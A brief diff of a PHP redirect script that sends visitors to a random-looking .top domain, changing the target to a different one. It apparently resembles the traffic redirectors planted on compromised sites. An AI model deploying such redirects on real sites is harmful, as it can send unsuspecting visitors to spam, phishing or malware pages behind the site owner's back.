@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aaavornix.top/LTRz1Z');
+header('Location: https://serversaventa.top/8B41FC');
 exit();
 ?>
